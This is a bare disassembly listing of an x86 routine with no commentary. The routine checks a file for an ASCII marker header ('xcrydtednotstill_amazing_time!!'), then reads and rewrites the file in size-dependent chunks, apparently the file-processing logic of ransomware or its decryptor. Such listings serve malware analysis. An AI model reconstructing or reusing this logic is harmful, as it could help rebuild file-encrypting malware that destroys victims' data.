  40242b:	ff 15 20 e0 41 00    	call   *0x41e020
  402431:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  402436:	0f 8c 93 07 00 00    	jl     0x402bcf
  40243c:	7f 0e                	jg     0x40244c
  40243e:	81 7c 24 14 58 02 00 	cmpl   $0x258,0x14(%esp)
  402445:	00 
  402446:	0f 86 83 07 00 00    	jbe    0x402bcf
  40244c:	68 00 00 10 00       	push   $0x100000
  402451:	e8 1a 72 00 00       	call   0x409670
  402456:	8b e8                	mov    %eax,%ebp
  402458:	83 c4 04             	add    $0x4,%esp
  40245b:	85 ed                	test   %ebp,%ebp
  40245d:	0f 84 53 07 00 00    	je     0x402bb6
  402463:	8b 7c 24 14          	mov    0x14(%esp),%edi
  402467:	8b 44 24 18          	mov    0x18(%esp),%eax
  40246b:	81 ef 58 02 00 00    	sub    $0x258,%edi
  402471:	6a 00                	push   $0x0
  402473:	83 d8 00             	sbb    $0x0,%eax
  402476:	6a 00                	push   $0x0
  402478:	50                   	push   %eax
  402479:	57                   	push   %edi
  40247a:	89 44 24 40          	mov    %eax,0x40(%esp)
  40247e:	a1 30 e0 41 00       	mov    0x41e030,%eax
  402483:	53                   	push   %ebx
  402484:	ff d0                	call   *%eax
  402486:	6a 00                	push   $0x0
  402488:	8d 44 24 14          	lea    0x14(%esp),%eax
  40248c:	50                   	push   %eax
  40248d:	68 58 02 00 00       	push   $0x258
  402492:	8d 84 24 94 00 00 00 	lea    0x94(%esp),%eax
  402499:	50                   	push   %eax
  40249a:	53                   	push   %ebx
  40249b:	ff 15 28 e0 41 00    	call   *0x41e028
  4024a1:	81 bc 24 b0 00 00 00 	cmpl   $0x79726378,0xb0(%esp)
  4024a8:	78 63 72 79 
  4024ac:	0f 85 e1 06 00 00    	jne    0x402b93
  4024b2:	81 bc 24 b4 00 00 00 	cmpl   $0x64657464,0xb4(%esp)
  4024b9:	64 74 65 64 
  4024bd:	0f 85 d0 06 00 00    	jne    0x402b93
  4024c3:	81 bc 24 b8 00 00 00 	cmpl   $0x73746f6e,0xb8(%esp)
  4024ca:	6e 6f 74 73 
  4024ce:	0f 85 bf 06 00 00    	jne    0x402b93
  4024d4:	81 bc 24 bc 00 00 00 	cmpl   $0x6c6c6974,0xbc(%esp)
  4024db:	74 69 6c 6c 
  4024df:	0f 85 ae 06 00 00    	jne    0x402b93
  4024e5:	81 bc 24 c0 00 00 00 	cmpl   $0x616d615f,0xc0(%esp)
  4024ec:	5f 61 6d 61 
  4024f0:	0f 85 9d 06 00 00    	jne    0x402b93
  4024f6:	81 bc 24 c4 00 00 00 	cmpl   $0x676e697a,0xc4(%esp)
  4024fd:	7a 69 6e 67 
  402501:	0f 85 8c 06 00 00    	jne    0x402b93
  402507:	81 bc 24 c8 00 00 00 	cmpl   $0x69745f67,0xc8(%esp)
  40250e:	67 5f 74 69 
  402512:	0f 85 7b 06 00 00    	jne    0x402b93
  402518:	81 bc 24 cc 00 00 00 	cmpl   $0x2121656d,0xcc(%esp)
  40251f:	6d 65 21 21 
  402523:	0f 85 6a 06 00 00    	jne    0x402b93
  402529:	81 44 24 14 a8 fd ff 	addl   $0xfffffda8,0x14(%esp)
  402530:	ff 
  402531:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  402538:	50                   	push   %eax
  402539:	ff 35 24 8d 42 00    	push   0x428d24
  40253f:	83 54 24 20 ff       	adcl   $0xffffffff,0x20(%esp)
  402544:	8d 84 24 b4 13 00 00 	lea    0x13b4(%esp),%eax
  40254b:	50                   	push   %eax
  40254c:	e8 ff 6f 00 00       	call   0x409550
  402551:	8d 44 24 54          	lea    0x54(%esp),%eax
  402555:	50                   	push   %eax
  402556:	8d 84 24 bc 13 00 00 	lea    0x13bc(%esp),%eax
  40255d:	6a 20                	push   $0x20
  40255f:	50                   	push   %eax
  402560:	e8 4b 2b 00 00       	call   0x4050b0
  402565:	8d 44 24 60          	lea    0x60(%esp),%eax
  402569:	6a 40                	push   $0x40
  40256b:	50                   	push   %eax
  40256c:	e8 6f 11 00 00       	call   0x4036e0
  402571:	83 c4 20             	add    $0x20,%esp
  402574:	39 84 24 a8 00 00 00 	cmp    %eax,0xa8(%esp)
  40257b:	0f 85 f0 05 00 00    	jne    0x402b71
  402581:	8b 35 30 e0 41 00    	mov    0x41e030,%esi
  402587:	6a 00                	push   $0x0
  402589:	6a 00                	push   $0x0
  40258b:	ff 74 24 38          	push   0x38(%esp)
  40258f:	57                   	push   %edi
  402590:	53                   	push   %ebx
  402591:	ff d6                	call   *%esi
  402593:	53                   	push   %ebx
  402594:	ff 15 2c e0 41 00    	call   *0x41e02c
  40259a:	68 00 01 00 00       	push   $0x100
  40259f:	68 00 01 00 00       	push   $0x100
  4025a4:	8d 44 24 50          	lea    0x50(%esp),%eax
  4025a8:	50                   	push   %eax
  4025a9:	8d 84 24 ec 02 00 00 	lea    0x2ec(%esp),%eax
  4025b0:	50                   	push   %eax
  4025b1:	e8 0a 2f 00 00       	call   0x4054c0
  4025b6:	8d 44 24 78          	lea    0x78(%esp),%eax
  4025ba:	50                   	push   %eax
  4025bb:	8d 84 24 f4 02 00 00 	lea    0x2f4(%esp),%eax
  4025c2:	50                   	push   %eax
  4025c3:	e8 a8 2b 00 00       	call   0x405170
  4025c8:	83 c4 18             	add    $0x18,%esp
  4025cb:	0f 57 c0             	xorps  %xmm0,%xmm0
  4025ce:	66 0f 13 44 24 20    	movlpd %xmm0,0x20(%esp)
  4025d4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4025d8:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4025dc:	6a 00                	push   $0x0
  4025de:	6a 00                	push   $0x0
  4025e0:	50                   	push   %eax
  4025e1:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4025e5:	50                   	push   %eax
  4025e6:	53                   	push   %ebx
  4025e7:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4025eb:	ff d6                	call   *%esi
  4025ed:	80 bc 24 d4 00 00 00 	cmpb   $0x0,0xd4(%esp)
  4025f4:	00 
  4025f5:	0f 84 69 03 00 00    	je     0x402964
  4025fb:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4025ff:	8b 74 24 14          	mov    0x14(%esp),%esi
  402603:	85 ff                	test   %edi,%edi
  402605:	0f 8c 32 01 00 00    	jl     0x40273d
  40260b:	7f 0c                	jg     0x402619
  40260d:	81 fe 00 00 40 01    	cmp    $0x1400000,%esi
  402613:	0f 86 5e 01 00 00    	jbe    0x402777
  402619:	6a 00                	push   $0x0
  40261b:	68 00 00 a0 00       	push   $0xa00000
  402620:	57                   	push   %edi
  402621:	56                   	push   %esi
  402622:	e8 b9 80 00 00       	call   0x40a6e0
  402627:	6a 00                	push   $0x0
  402629:	68 00 00 a0 00       	push   $0xa00000
  40262e:	57                   	push   %edi
  40262f:	56                   	push   %esi
  402630:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402634:	89 54 24 40          	mov    %edx,0x40(%esp)
  402638:	e8 73 82 00 00       	call   0x40a8b0
  40263d:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  402641:	0b c2                	or     %edx,%eax
  402643:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402647:	74 0e                	je     0x402657
  402649:	83 c0 01             	add    $0x1,%eax
  40264c:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402650:	83 d1 00             	adc    $0x0,%ecx
  402653:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  402657:	0f 57 c0             	xorps  %xmm0,%xmm0
  40265a:	66 0f 13 44 24 20    	movlpd %xmm0,0x20(%esp)
  402660:	85 c9                	test   %ecx,%ecx
  402662:	0f 8c d5 00 00 00    	jl     0x40273d
  402668:	7f 08                	jg     0x402672
  40266a:	85 c0                	test   %eax,%eax
  40266c:	0f 84 cb 00 00 00    	je     0x40273d
  402672:	8b 44 24 24          	mov    0x24(%esp),%eax
  402676:	66 0f 13 44 24 3c    	movlpd %xmm0,0x3c(%esp)
  40267c:	8b 7c 24 40          	mov    0x40(%esp),%edi
  402680:	8b 74 24 3c          	mov    0x3c(%esp),%esi
  402684:	89 44 24 28          	mov    %eax,0x28(%esp)
  402688:	8b 44 24 20          	mov    0x20(%esp),%eax
  40268c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402690:	a1 30 e0 41 00       	mov    0x41e030,%eax
  402695:	6a 00                	push   $0x0
  402697:	6a 00                	push   $0x0
  402699:	57                   	push   %edi
  40269a:	56                   	push   %esi
  40269b:	53                   	push   %ebx
  40269c:	ff d0                	call   *%eax
  40269e:	b9 00 10 00 00       	mov    $0x1000,%ecx
  4026a3:	8b d6                	mov    %esi,%edx
  4026a5:	03 d1                	add    %ecx,%edx
  4026a7:	8b c7                	mov    %edi,%eax
  4026a9:	83 d0 00             	adc    $0x0,%eax
  4026ac:	3b 44 24 18          	cmp    0x18(%esp),%eax
  4026b0:	7c 0e                	jl     0x4026c0
  4026b2:	8b 44 24 14          	mov    0x14(%esp),%eax
  4026b6:	7f 04                	jg     0x4026bc
  4026b8:	3b d0                	cmp    %eax,%edx
  4026ba:	76 04                	jbe    0x4026c0
  4026bc:	8b c8                	mov    %eax,%ecx
  4026be:	2b ce                	sub    %esi,%ecx
  4026c0:	6a 00                	push   $0x0
  4026c2:	8d 44 24 14          	lea    0x14(%esp),%eax
  4026c6:	50                   	push   %eax
  4026c7:	51                   	push   %ecx
  4026c8:	55                   	push   %ebp
  4026c9:	53                   	push   %ebx
  4026ca:	ff 15 28 e0 41 00    	call   *0x41e028
  4026d0:	ff 74 24 10          	push   0x10(%esp)
  4026d4:	8d 84 24 e4 02 00 00 	lea    0x2e4(%esp),%eax
  4026db:	55                   	push   %ebp
  4026dc:	55                   	push   %ebp
  4026dd:	50                   	push   %eax
  4026de:	6a 00                	push   $0x0
  4026e0:	e8 4b 2e 00 00       	call   0x405530
  4026e5:	83 c4 14             	add    $0x14,%esp
  4026e8:	6a 00                	push   $0x0
  4026ea:	6a 00                	push   $0x0
  4026ec:	57                   	push   %edi
  4026ed:	56                   	push   %esi
  4026ee:	53                   	push   %ebx
  4026ef:	ff 15 30 e0 41 00    	call   *0x41e030
  4026f5:	6a 00                	push   $0x0
  4026f7:	8d 44 24 48          	lea    0x48(%esp),%eax
  4026fb:	50                   	push   %eax
  4026fc:	ff 74 24 18          	push   0x18(%esp)
  402700:	55                   	push   %ebp
  402701:	53                   	push   %ebx
  402702:	ff 15 34 e0 41 00    	call   *0x41e034
  402708:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40270c:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402710:	83 c0 01             	add    $0x1,%eax
  402713:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402717:	83 d1 00             	adc    $0x0,%ecx
  40271a:	81 c6 00 00 a0 00    	add    $0xa00000,%esi
  402720:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  402724:	83 d7 00             	adc    $0x0,%edi
  402727:	3b 4c 24 30          	cmp    0x30(%esp),%ecx
  40272b:	0f 8c 5f ff ff ff    	jl     0x402690
  402731:	7f 0a                	jg     0x40273d
  402733:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  402737:	0f 82 53 ff ff ff    	jb     0x402690
  40273d:	68 cc 10 00 00       	push   $0x10cc
  402742:	8d 84 24 e4 02 00 00 	lea    0x2e4(%esp),%eax
  402749:	6a 00                	push   $0x0
  40274b:	50                   	push   %eax
  40274c:	e8 cf 6f 00 00       	call   0x409720
  402751:	6a 40                	push   $0x40
  402753:	8d 44 24 58          	lea    0x58(%esp),%eax
  402757:	6a 00                	push   $0x0
  402759:	50                   	push   %eax
  40275a:	e8 c1 6f 00 00       	call   0x409720
  40275f:	83 c4 18             	add    $0x18,%esp
  402762:	55                   	push   %ebp
  402763:	e8 38 6f 00 00       	call   0x4096a0
  402768:	83 c4 04             	add    $0x4,%esp
  40276b:	53                   	push   %ebx
  40276c:	ff 15 38 e0 41 00    	call   *0x41e038
  402772:	e9 84 fa ff ff       	jmp    0x4021fb
  402777:	85 ff                	test   %edi,%edi
  402779:	7c c2                	jl     0x40273d
  40277b:	7f 0c                	jg     0x402789
  40277d:	81 fe 00 00 50 00    	cmp    $0x500000,%esi
  402783:	0f 86 eb 00 00 00    	jbe    0x402874
  402789:	6a 00                	push   $0x0
  40278b:	6a 06                	push   $0x6
  40278d:	57                   	push   %edi
  40278e:	56                   	push   %esi
  40278f:	e8 4c 7f 00 00       	call   0x40a6e0
  402794:	0f 57 c0             	xorps  %xmm0,%xmm0
  402797:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40279b:	66 0f 13 44 24 30    	movlpd %xmm0,0x30(%esp)
  4027a1:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4027a5:	8b 44 24 30          	mov    0x30(%esp),%eax
  4027a9:	66 0f 13 44 24 20    	movlpd %xmm0,0x20(%esp)
  4027af:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4027b3:	8b 74 24 20          	mov    0x20(%esp),%esi
  4027b7:	89 54 24 28          	mov    %edx,0x28(%esp)
  4027bb:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4027bf:	89 44 24 30          	mov    %eax,0x30(%esp)
  4027c3:	6a 00                	push   $0x0
  4027c5:	6a 00                	push   $0x0
  4027c7:	57                   	push   %edi
  4027c8:	56                   	push   %esi
  4027c9:	53                   	push   %ebx
  4027ca:	ff 15 30 e0 41 00    	call   *0x41e030
  4027d0:	b9 00 10 00 00       	mov    $0x1000,%ecx
  4027d5:	8b d6                	mov    %esi,%edx
  4027d7:	03 d1                	add    %ecx,%edx
  4027d9:	8b c7                	mov    %edi,%eax
  4027db:	83 d0 00             	adc    $0x0,%eax
  4027de:	3b 44 24 18          	cmp    0x18(%esp),%eax
  4027e2:	7c 0e                	jl     0x4027f2
  4027e4:	8b 44 24 14          	mov    0x14(%esp),%eax
  4027e8:	7f 04                	jg     0x4027ee
  4027ea:	3b d0                	cmp    %eax,%edx
  4027ec:	76 04                	jbe    0x4027f2
  4027ee:	8b c8                	mov    %eax,%ecx
  4027f0:	2b ce                	sub    %esi,%ecx
  4027f2:	6a 00                	push   $0x0
  4027f4:	8d 44 24 14          	lea    0x14(%esp),%eax
  4027f8:	50                   	push   %eax
  4027f9:	51                   	push   %ecx
  4027fa:	55                   	push   %ebp
  4027fb:	53                   	push   %ebx
  4027fc:	ff 15 28 e0 41 00    	call   *0x41e028
  402802:	ff 74 24 10          	push   0x10(%esp)
  402806:	8d 84 24 e4 02 00 00 	lea    0x2e4(%esp),%eax
  40280d:	55                   	push   %ebp
  40280e:	55                   	push   %ebp
  40280f:	50                   	push   %eax
  402810:	6a 00                	push   $0x0
  402812:	e8 19 2d 00 00       	call   0x405530
  402817:	83 c4 14             	add    $0x14,%esp
  40281a:	6a 00                	push   $0x0
  40281c:	6a 00                	push   $0x0
  40281e:	57                   	push   %edi
  40281f:	56                   	push   %esi
  402820:	53                   	push   %ebx
  402821:	ff 15 30 e0 41 00    	call   *0x41e030
  402827:	6a 00                	push   $0x0
  402829:	8d 44 24 48          	lea    0x48(%esp),%eax
  40282d:	50                   	push   %eax
  40282e:	ff 74 24 18          	push   0x18(%esp)
  402832:	55                   	push   %ebp
  402833:	53                   	push   %ebx
  402834:	ff 15 34 e0 41 00    	call   *0x41e034
  40283a:	8b 44 24 30          	mov    0x30(%esp),%eax
  40283e:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402842:	83 c0 01             	add    $0x1,%eax
  402845:	89 44 24 30          	mov    %eax,0x30(%esp)
  402849:	83 d1 00             	adc    $0x0,%ecx
  40284c:	03 74 24 2c          	add    0x2c(%esp),%esi
  402850:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  402854:	13 7c 24 28          	adc    0x28(%esp),%edi
  402858:	85 c9                	test   %ecx,%ecx
  40285a:	0f 8c 63 ff ff ff    	jl     0x4027c3
  402860:	0f 8f d7 fe ff ff    	jg     0x40273d
  402866:	83 f8 06             	cmp    $0x6,%eax
  402869:	0f 82 54 ff ff ff    	jb     0x4027c3
  40286f:	e9 c9 fe ff ff       	jmp    0x40273d
  402874:	85 ff                	test   %edi,%edi
  402876:	0f 8c c1 fe ff ff    	jl     0x40273d
  40287c:	7f 05                	jg     0x402883
  40287e:	83 fe 40             	cmp    $0x40,%esi
  402881:	76 61                	jbe    0x4028e4
  402883:	8b c6                	mov    %esi,%eax
  402885:	8b cf                	mov    %edi,%ecx
  402887:	0f a4 c1 02          	shld   $0x2,%eax,%ecx
  40288b:	6a 00                	push   $0x0
  40288d:	c1 e0 02             	shl    $0x2,%eax
  402890:	03 f0                	add    %eax,%esi
  402892:	6a 64                	push   $0x64
  402894:	13 f9                	adc    %ecx,%edi
  402896:	0f a4 f7 01          	shld   $0x1,%esi,%edi
  40289a:	57                   	push   %edi
  40289b:	03 f6                	add    %esi,%esi
  40289d:	56                   	push   %esi
  40289e:	e8 3d 7e 00 00       	call   0x40a6e0
  4028a3:	8b c8                	mov    %eax,%ecx
  4028a5:	89 44 24 30          	mov    %eax,0x30(%esp)
  4028a9:	0b ca                	or     %edx,%ecx
  4028ab:	75 0c                	jne    0x4028b9
  4028ad:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%esp)
  4028b4:	00 
  4028b5:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4028b9:	6a 00                	push   $0x0
  4028bb:	0f 57 c0             	xorps  %xmm0,%xmm0
  4028be:	66 0f 13 44 24 24    	movlpd %xmm0,0x24(%esp)
  4028c4:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4028c8:	8b 74 24 24          	mov    0x24(%esp),%esi
  4028cc:	6a 00                	push   $0x0
  4028ce:	57                   	push   %edi
  4028cf:	56                   	push   %esi
  4028d0:	53                   	push   %ebx
  4028d1:	ff 15 30 e0 41 00    	call   *0x41e030
  4028d7:	6a 00                	push   $0x0
  4028d9:	8d 44 24 14          	lea    0x14(%esp),%eax
  4028dd:	50                   	push   %eax
  4028de:	ff 74 24 38          	push   0x38(%esp)
  4028e2:	eb 3b                	jmp    0x40291f
  4028e4:	85 ff                	test   %edi,%edi
  4028e6:	0f 8c 51 fe ff ff    	jl     0x40273d
  4028ec:	7f 08                	jg     0x4028f6
  4028ee:	85 f6                	test   %esi,%esi
  4028f0:	0f 84 47 fe ff ff    	je     0x40273d
  4028f6:	6a 00                	push   $0x0
  4028f8:	0f 57 c0             	xorps  %xmm0,%xmm0
  4028fb:	66 0f 13 44 24 24    	movlpd %xmm0,0x24(%esp)
  402901:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402905:	8b 74 24 24          	mov    0x24(%esp),%esi
  402909:	6a 00                	push   $0x0
  40290b:	57                   	push   %edi
  40290c:	56                   	push   %esi
  40290d:	53                   	push   %ebx
  40290e:	ff 15 30 e0 41 00    	call   *0x41e030
  402914:	6a 00                	push   $0x0
  402916:	8d 44 24 14          	lea    0x14(%esp),%eax
  40291a:	50                   	push   %eax
  40291b:	ff 74 24 1c          	push   0x1c(%esp)
  40291f:	55                   	push   %ebp
  402920:	53                   	push   %ebx
  402921:	ff 15 28 e0 41 00    	call   *0x41e028
  402927:	ff 74 24 10          	push   0x10(%esp)
  40292b:	8d 84 24 e4 02 00 00 	lea    0x2e4(%esp),%eax
  402932:	55                   	push   %ebp
  402933:	55                   	push   %ebp
  402934:	50                   	push   %eax
  402935:	6a 00                	push   $0x0
  402937:	e8 f4 2b 00 00       	call   0x405530
  40293c:	83 c4 14             	add    $0x14,%esp
  40293f:	6a 00                	push   $0x0
  402941:	6a 00                	push   $0x0
  402943:	57                   	push   %edi
  402944:	56                   	push   %esi
  402945:	53                   	push   %ebx
  402946:	ff 15 30 e0 41 00    	call   *0x41e030
  40294c:	6a 00                	push   $0x0
  40294e:	8d 44 24 48          	lea    0x48(%esp),%eax
  402952:	50                   	push   %eax
  402953:	ff 74 24 18          	push   0x18(%esp)
  402957:	55                   	push   %ebp
  402958:	53                   	push   %ebx
  402959:	ff 15 34 e0 41 00    	call   *0x41e034
  40295f:	e9 d9 fd ff ff       	jmp    0x40273d
  402964:	8b 54 24 18          	mov    0x18(%esp),%edx
  402968:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40296c:	85 d2                	test   %edx,%edx
  40296e:	7f 14                	jg     0x402984
  402970:	7c 08                	jl     0x40297a
  402972:	81 f9 00 00 50 00    	cmp    $0x500000,%ecx
  402978:	77 0a                	ja     0x402984
  40297a:	8b c1                	mov    %ecx,%eax
  40297c:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  402980:	8b f2                	mov    %edx,%esi
  402982:	eb 51                	jmp    0x4029d5
  402984:	8b 84 24 d0 00 00 00 	mov    0xd0(%esp),%eax
  40298b:	83 f8 64             	cmp    $0x64,%eax
  40298e:	75 22                	jne    0x4029b2
  402990:	8b f1                	mov    %ecx,%esi
  402992:	8b c1                	mov    %ecx,%eax
  402994:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402998:	0f a4 c1 02          	shld   $0x2,%eax,%ecx
  40299c:	6a 00                	push   $0x0
  40299e:	c1 e0 02             	shl    $0x2,%eax
  4029a1:	03 f0                	add    %eax,%esi
  4029a3:	6a 64                	push   $0x64
  4029a5:	13 d1                	adc    %ecx,%edx
  4029a7:	0f a4 f2 02          	shld   $0x2,%esi,%edx
  4029ab:	c1 e6 02             	shl    $0x2,%esi
  4029ae:	52                   	push   %edx
  4029af:	56                   	push   %esi
  4029b0:	eb 10                	jmp    0x4029c2
  4029b2:	52                   	push   %edx
  4029b3:	51                   	push   %ecx
  4029b4:	6a 00                	push   $0x0
  4029b6:	50                   	push   %eax
  4029b7:	e8 b4 7e 00 00       	call   0x40a870
  4029bc:	6a 00                	push   $0x0
  4029be:	6a 64                	push   $0x64
  4029c0:	52                   	push   %edx
  4029c1:	50                   	push   %eax
  4029c2:	e8 19 7d 00 00       	call   0x40a6e0
  4029c7:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4029cb:	8b f2                	mov    %edx,%esi
  4029cd:	8b 54 24 18          	mov    0x18(%esp),%edx
  4029d1:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4029d5:	89 74 24 38          	mov    %esi,0x38(%esp)
  4029d9:	85 f6                	test   %esi,%esi
  4029db:	7c 2b                	jl     0x402a08
  4029dd:	7f 07                	jg     0x4029e6
  4029df:	3d 00 00 60 04       	cmp    $0x4600000,%eax
  4029e4:	76 22                	jbe    0x402a08
  4029e6:	0f 57 c0             	xorps  %xmm0,%xmm0
  4029e9:	c7 44 24 3c 00 00 60 	movl   $0x4600000,0x3c(%esp)
  4029f0:	04 
  4029f1:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  4029f8:	00 
  4029f9:	be 00 00 10 00       	mov    $0x100000,%esi
  4029fe:	33 ff                	xor    %edi,%edi
  402a00:	66 0f 13 44 24 20    	movlpd %xmm0,0x20(%esp)
  402a06:	eb 24                	jmp    0x402a2c
  402a08:	33 ff                	xor    %edi,%edi
  402a0a:	0f 57 c0             	xorps  %xmm0,%xmm0
  402a0d:	be 00 00 10 00       	mov    $0x100000,%esi
  402a12:	66 0f 13 44 24 20    	movlpd %xmm0,0x20(%esp)
  402a18:	39 7c 24 38          	cmp    %edi,0x38(%esp)
  402a1c:	0f 8c 1b fd ff ff    	jl     0x40273d
  402a22:	7f 08                	jg     0x402a2c
  402a24:	85 c0                	test   %eax,%eax
  402a26:	0f 84 11 fd ff ff    	je     0x40273d
  402a2c:	8b 44 24 24          	mov    0x24(%esp),%eax
  402a30:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402a34:	8b 44 24 20          	mov    0x20(%esp),%eax
  402a38:	89 44 24 30          	mov    %eax,0x30(%esp)
  402a3c:	0f 1f 40 00          	nopl   0x0(%eax)
  402a40:	03 c6                	add    %esi,%eax
  402a42:	89 44 24 20          	mov    %eax,0x20(%esp)
  402a46:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402a4a:	13 c7                	adc    %edi,%eax
  402a4c:	3b 44 24 38          	cmp    0x38(%esp),%eax
  402a50:	7c 1a                	jl     0x402a6c
  402a52:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402a56:	7f 06                	jg     0x402a5e
  402a58:	39 44 24 20          	cmp    %eax,0x20(%esp)
  402a5c:	76 0e                	jbe    0x402a6c
  402a5e:	8b 7c 24 38          	mov    0x38(%esp),%edi
  402a62:	8b f0                	mov    %eax,%esi
  402a64:	2b 74 24 30          	sub    0x30(%esp),%esi
  402a68:	1b 7c 24 1c          	sbb    0x1c(%esp),%edi
  402a6c:	8b c6                	mov    %esi,%eax
  402a6e:	03 44 24 28          	add    0x28(%esp),%eax
  402a72:	89 44 24 20          	mov    %eax,0x20(%esp)
  402a76:	8b c7                	mov    %edi,%eax
  402a78:	13 44 24 2c          	adc    0x2c(%esp),%eax
  402a7c:	3b c2                	cmp    %edx,%eax
  402a7e:	7c 14                	jl     0x402a94
  402a80:	7f 06                	jg     0x402a88
  402a82:	39 4c 24 20          	cmp    %ecx,0x20(%esp)
  402a86:	76 0c                	jbe    0x402a94
  402a88:	8b f1                	mov    %ecx,%esi
  402a8a:	8b fa                	mov    %edx,%edi
  402a8c:	2b 74 24 28          	sub    0x28(%esp),%esi
  402a90:	1b 7c 24 2c          	sbb    0x2c(%esp),%edi
  402a94:	85 ff                	test   %edi,%edi
  402a96:	0f 8c a1 fc ff ff    	jl     0x40273d
  402a9c:	7f 08                	jg     0x402aa6
  402a9e:	85 f6                	test   %esi,%esi
  402aa0:	0f 84 97 fc ff ff    	je     0x40273d
  402aa6:	6a 00                	push   $0x0
  402aa8:	8d 44 24 14          	lea    0x14(%esp),%eax
  402aac:	50                   	push   %eax
  402aad:	56                   	push   %esi
  402aae:	55                   	push   %ebp
  402aaf:	53                   	push   %ebx
  402ab0:	ff 15 28 e0 41 00    	call   *0x41e028
  402ab6:	8b 44 24 10          	mov    0x10(%esp),%eax
  402aba:	85 c0                	test   %eax,%eax
  402abc:	0f 84 7b fc ff ff    	je     0x40273d
  402ac2:	50                   	push   %eax
  402ac3:	55                   	push   %ebp
  402ac4:	55                   	push   %ebp
  402ac5:	8d 84 24 ec 02 00 00 	lea    0x2ec(%esp),%eax
  402acc:	50                   	push   %eax
  402acd:	6a 00                	push   $0x0
  402acf:	e8 5c 2a 00 00       	call   0x405530
  402ad4:	83 c4 14             	add    $0x14,%esp
  402ad7:	6a 00                	push   $0x0
  402ad9:	6a 00                	push   $0x0
  402adb:	ff 74 24 34          	push   0x34(%esp)
  402adf:	ff 74 24 34          	push   0x34(%esp)
  402ae3:	53                   	push   %ebx
  402ae4:	ff 15 30 e0 41 00    	call   *0x41e030
  402aea:	6a 00                	push   $0x0
  402aec:	8d 44 24 48          	lea    0x48(%esp),%eax
  402af0:	50                   	push   %eax
  402af1:	ff 74 24 18          	push   0x18(%esp)
  402af5:	55                   	push   %ebp
  402af6:	53                   	push   %ebx
  402af7:	ff 15 34 e0 41 00    	call   *0x41e034
  402afd:	8b 44 24 10          	mov    0x10(%esp),%eax
  402b01:	01 44 24 30          	add    %eax,0x30(%esp)
  402b05:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402b09:	83 54 24 1c 00       	adcl   $0x0,0x1c(%esp)
  402b0e:	03 c8                	add    %eax,%ecx
  402b10:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402b14:	6a 00                	push   $0x0
  402b16:	6a 00                	push   $0x0
  402b18:	83 d0 00             	adc    $0x0,%eax
  402b1b:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  402b1f:	50                   	push   %eax
  402b20:	51                   	push   %ecx
  402b21:	53                   	push   %ebx
  402b22:	89 44 24 40          	mov    %eax,0x40(%esp)
  402b26:	ff 15 30 e0 41 00    	call   *0x41e030
  402b2c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402b30:	3b 44 24 38          	cmp    0x38(%esp),%eax
  402b34:	7c 2a                	jl     0x402b60
  402b36:	0f 8f 01 fc ff ff    	jg     0x40273d
  402b3c:	8b 44 24 30          	mov    0x30(%esp),%eax
  402b40:	3b 44 24 3c          	cmp    0x3c(%esp),%eax
  402b44:	0f 83 f3 fb ff ff    	jae    0x40273d
  402b4a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402b4e:	8b 54 24 18          	mov    0x18(%esp),%edx
  402b52:	e9 e9 fe ff ff       	jmp    0x402a40
  402b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  402b5e:	00 00 
  402b60:	8b 44 24 30          	mov    0x30(%esp),%eax
  402b64:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402b68:	8b 54 24 18          	mov    0x18(%esp),%edx
  402b6c:	e9 cf fe ff ff       	jmp    0x402a40
  402b71:	68 d0 e4 41 00       	push   $0x41e4d0
  402b76:	e8 35 0b 00 00       	call   0x4036b0
  402b7b:	83 c4 04             	add    $0x4,%esp
  402b7e:	55                   	push   %ebp
  402b7f:	e8 1c 6b 00 00       	call   0x4096a0
  402b84:	83 c4 04             	add    $0x4,%esp
  402b87:	53                   	push   %ebx
  402b88:	ff 15 38 e0 41 00    	call   *0x41e038
  402b8e:	e9 68 f6 ff ff       	jmp    0x4021fb
  402b93:	56                   	push   %esi
  402b94:	68 48 e5 41 00       	push   $0x41e548
  402b99:	e8 12 0b 00 00       	call   0x4036b0
  402b9e:	83 c4 08             	add    $0x8,%esp
  402ba1:	55                   	push   %ebp
  402ba2:	e8 f9 6a 00 00       	call   0x4096a0
  402ba7:	83 c4 04             	add    $0x4,%esp
  402baa:	53                   	push   %ebx
  402bab:	ff 15 38 e0 41 00    	call   *0x41e038
